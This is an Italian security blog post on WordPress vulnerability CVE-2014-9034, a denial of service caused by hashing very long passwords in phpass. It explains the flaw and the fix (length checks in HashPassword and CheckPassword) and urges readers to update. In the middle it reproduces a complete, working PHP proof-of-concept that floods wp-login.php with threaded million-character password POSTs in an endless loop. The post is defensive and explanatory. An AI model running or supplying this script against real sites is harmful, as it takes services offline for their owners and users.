---
layout: post
author: thesp0nge
title: "Tesoro, si è rotto il blog"
modified: 2014-12-02 07:55:30 +0100
category: [Under attack]
tags: [wordpress, wordstress, blog, dos, exploit, CVE-2014-9034]
image:
  feature: ciuccio.png
comments: true
share: true
---

## Premesse e piccoli aggiornamenti

In questo mese e mezzo quasi di silenzio mi sono dedicato ad una dashboard per
i risultati di [wpscan](http://wpscan.org) che ho mostrato anche all'ultimo
Festival ICT nel mio talk.

Spinoff di questa dashboard è un tool,
[wordstress](https://github.com/thesp0nge/wordstress) che vuole essere
un'alternativa al più blasonato wpscan ma dedicato unicamente al test whitebox.

Il problema di wpscan, secondo me, è che provando a fare enumerazione dei
plugin e dei temi, poi fallisca nel rilevare la versione e quindi io mi trovo
un report con dei falsi positivi. Questi falsi positivi devono essere
analizzati e filtrati e questo si traduce in lavoro per l'appsec guy... che
sono io. Visto che la mia battaglia per i prossimi anni è "automatizzare
l'automatizzabile", questa parte di analisi voglio farla sparire.

Voglio quindi lavorare installando sul blog un plugin, che devo ancora
scrivere, che mi dica i plugin e i temi installati con l'esatta versione. Con
risultati più accurati io posso dedicarmi ad ammirare la dashboard e ad
indirizzare le reali vulnerabilità che vengono rilevate.

## L'effetto ciucciotto

Mia figlia Anna, e Daniele prima di lei, ama i suoi ciucci. Ci sono giorni che
non ne può fare a meno. Che cadano per terra, si intrufolino in pertugi o siano
lindi ed immacolati per lei non fa importanza. Il ciucciottamento felice è un
bel passatempo.

Ecco, [wordpress](https://wordpress.org) è come il ciucciotto di Anna; attira
vulnerabilità e issue di sicurezza con la velocità con la quale un ciucciotto
cadendo per terra attira batteri e bacilli.

> Volendo fare un'iperbole, wordpress è il windows delle applicazioni web.

In passato è stato martoriato, ora è un po' più robusto, ma a naso[^1] per una
versione X, escono almeno 3 issue di security al mese.

## CVE-2014-9034

Il 25 Novembre, è uscita la vulnerabilità
([CVE-2014-9034](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-9034))
che interessa le versioni di wordpress antecedenti alla 4.0.1. La classe
class-phpass.php non gestisce bene password lunghe durante la fase di hashing,
questo permette ad un attaccante di causare un denial of service facendo una
serie di richieste con password lunghe, facciamo dalle migliaia di caratteri in
su.

La PoC per sfruttare la vulnerabilità è disponibile in rete ed è molto
semplice: faccio una POST con una password di un milione di caratteri e ripeto
questa POST tante volte.



{% highlight php %}

<?php

echo "\nCVE-2014-9034 | WordPress <= v4.0 Denial of Service Vulnerability\n";
echo "Proof-of-Concept developed by john@secureli.com (http://secureli.com)\n\n";
echo "usage: php wordpressed.php domain.com username numberOfThreads\n";
echo " e.g.: php wordpressed.php wordpress.org admin 50\n\n";

echo "Sending POST data (username: " . $argv[2] . "; threads: " . $argv[3] . ") to " . $argv[1];

do {
 
$multi = curl_multi_init();
$channels = array();

for ($x = 0; $x < $argv[3]; $x++) {
	$ch = curl_init();

	$postData = array(
		'log' => $argv[2],
		'pwd' => str_repeat("A",1000000),
		'redirect_to' => $argv[1] . "/wp-admin/",
		'reauth' => 1,
		'testcookie' => '1',
		'wp-submit' => "Log%20In");

	$cookieFiles = "cookie.txt";

	curl_setopt_array($ch, array(
	    CURLOPT_HEADER => 1,
	    CURLOPT_USERAGENT => "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6",
	    CURLOPT_REFERER => $argv[1] . "/wp-admin/",
	    CURLOPT_COOKIEJAR => $cookieFiles,
	    CURLOPT_COOKIESESSION => true,
	    CURLOPT_URL => $argv[1] . '/wp-login.php',
	    CURLOPT_RETURNTRANSFER => true,
	    CURLOPT_POST => true,
	    CURLOPT_POSTFIELDS => $postData,
	    CURLOPT_FOLLOWLOCATION => true));
    curl_multi_add_handle($multi, $ch);
 
    $channels[$x] = $ch;
}
 
$active = null;

do {
	$mrc = curl_multi_exec($multi, $active);
} while ($mrc == CURLM_CALL_MULTI_PERFORM);
 
while ($active && $mrc == CURLM_OK) {
    do {

        $mrc = curl_multi_exec($multi, $active);
    } while ($mrc == CURLM_CALL_MULTI_PERFORM);
}

foreach ($channels as $channel) {
    curl_multi_remove_handle($multi, $channel);
}
 
curl_multi_close($multi);
echo ".";
} while (1==1);

?>

{% endhighlight %}

Il problema è nella libreria [phpass](http://www.openwall.com/phpass) di Solar
Designer che quando esegue l'hash di una password lunga, usa troppa CPU.
[Stesso
problema](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-9016) che
ha afflitto Drupal di recente, visto che entrambi usano questa libreria.

La [versione corretta della libreria
phpass](https://github.com/WordPress/WordPress/blob/master/wp-includes/class-phpass.php),
introduce un controllo sulla lunghezza della password nella funzione
HashPassword.

{%highlight php%}
function HashPassword($password)
{
  if ( strlen( $password ) > 4096 ) {
    return '*';
  }
  $random = '';
  ...
{%endhighlight%}

Lo stesso controllo nella routine CheckPassword

{%highlight php%}
function CheckPassword($password, $stored_hash)
{
  if ( strlen( $password ) > 4096 ) {
    return false;
  }
  ...
{%endhighlight%}

Se quindi siete impossibilitati ad aggiornare Wordpress per qualche ragione
**incomprensibile** che **non** voglio neanche conoscere, potete fare patching
della libreria rimanendo alla versione di wordpress che avete installato.
Attenzione però, che questi due controlli rimediano solo questa issue, non le
[altre](http://openwall.com/lists/oss-security/2014/11/25/12).


Come si vede dal [post sulla mailing list per l'assegnazione dei
CVE](http://openwall.com/lists/oss-security/2014/11/25/12), ci sono altre issue
di security sempre censite lo stesso giorno e coperte dalla release 4.0.1 che,
ovviamente, è la soluzione ai problemi... di questo inizio di inverno.

## Off by one

Wordpress è bersagliato, complice il fatto di essere leader del mercato delle
piattaforme di blogging. Potrebbe essere un vanto questo. Il problema semmai è
nostro.

Aggiorniamo i nostri wordpress? Controlliamo i plugin ed i temi? Manteniamo il
nostro codice? Disaccoppiamo il codice custom dal core?

Se lo facciamo, sarà come dare sempre una rinfrescata al nostro ciucciotto.

Enjoy it!

**UPDATE**

So che il lettore fedele lo sa già, ma lanciare il poc su un blog che non si è
autorizzati a testare, è un reato da codice penale praticamente da ogni parte
del mondo.
Quindi, fatelo solo per test sui wordpress vostri o della società alla quale
appartenete.

[^1]: ho osservato un po' qualche versione, ma non ho fatto una statistica vera.
